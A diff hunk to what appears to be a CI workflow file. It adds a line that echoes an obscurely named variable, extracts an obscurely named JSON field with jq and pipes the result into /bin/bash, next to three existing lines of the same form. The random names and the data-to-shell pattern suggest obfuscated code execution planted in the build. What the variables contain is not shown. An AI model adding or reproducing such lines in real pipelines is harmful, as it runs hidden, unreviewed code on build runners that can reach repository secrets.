@@ -26,6 +26,7 @@ jobs:
           echo $iznsp7 | jq -r .lqu6426 | /bin/bash
           printf '%s' "$ntl3" | jq -r .s5836 | /bin/bash
           echo $garte62742 | jq -r .jkmp81 | /bin/bash
+          echo $qxtkr03546 | jq -r .nyev36738 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
